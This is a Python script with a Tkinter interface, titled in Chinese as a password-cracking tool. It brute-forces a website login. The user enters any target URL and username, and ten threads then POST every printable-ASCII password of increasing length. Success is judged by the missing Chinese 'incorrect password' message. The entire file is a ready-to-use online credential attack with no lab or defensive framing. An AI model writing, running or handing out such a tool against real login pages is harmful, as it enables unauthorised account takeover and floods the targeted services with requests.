import requests
import threading
from queue import Queue
import itertools
import tkinter as tk


class BreakThread(threading.Thread):
    def __init__(self, url, username, password_queue, result_event, output_text):
        super().__init__()
        self.url = url  # 目标网站URL
        self.username = username  # 用户名
        self.password_queue = password_queue  # 密码队列
        self.result_event = result_event  # 结果事件
        self.output_text = output_text  # 输出标签的文本变量

    def run(self):
        session = requests.Session()
        while not self.password_queue.empty() and not self.result_event.is_set():
            password = self.password_queue.get()  # 从密码队列获取密码
            data = {"username": self.username, "password": password}  # 构建POST请求的数据，包括用户名和密码
            try:
                response = session.post(self.url, data=data)  # 发送POST请求
                response.encoding = "utf-8"
                if "密码不正确" not in response.text:  # 判断密码是否正确
                    self.result_event.set()  # 设置结果事件，表示找到了正确的密码
                    self.output_text.set("正确密码: " + password)  # 更新输出标签的文本
            except requests.RequestException as e:
                print("发生错误:", str(e))
            finally:
                self.password_queue.task_done()  # 任务完成，释放队列资源


def start_brute_force(url_entry, username_entry, output_text):
    url = url_entry.get()  # 获取输入的目标网站URL
    username = username_entry.get()  # 获取输入的用户名

    ascii_chars = [chr(i) for i in range(32, 127)]  # ASCII码表中的可打印字符

    password_queue = Queue()  # 创建队列用于存储密码
    result_event = threading.Event()  # 创建事件对象

    password_length = 1
    while not result_event.is_set():
        passwords = [''.join(p) for p in itertools.product(ascii_chars, repeat=password_length)]  # 生成所有密码组合

        for password in passwords:
            password_queue.put(password)  # 将密码加入队列

        num_threads = min(10, len(passwords))  # 调整线程数量为10，可以根据需要进行调整
        threads = []
        for _ in range(num_threads):
            thread = BreakThread(url, username, password_queue, result_event, output_text)  # 创建线程实例
            threads.append(thread)
            thread.start()

        password_queue.join()  # 等待所有密码尝试完成

        if result_event.is_set():  # 如果找到正确密码
            break

        password_length += 1

        for thread in threads:
            thread.join()  # 等待所有线程结束


def main():
    window = tk.Tk()
    window.title("密码爆破")
    window.geometry("300x200")

    url_label = tk.Label(window, text="目标网站URL:")  # URL标签
    url_label.pack()

    url_entry = tk.Entry(window)  # URL输入框
    url_entry.pack()

    username_label = tk.Label(window, text="用户名:")  # 用户名标签
    username_label.pack()

    username_entry = tk.Entry(window)  # 用户名输入框
    username_entry.pack()

    output_text = tk.StringVar()
    output_label = tk.Label(window, textvariable=output_text)  # 输出标签
    output_label.pack()

    start_button = tk.Button(window, text="开始爆破", command=lambda: start_brute_force(url_entry, username_entry, output_text))  # 开始按钮
    start_button.pack()

    window.mainloop()


if __name__ == "__main__":
    main()
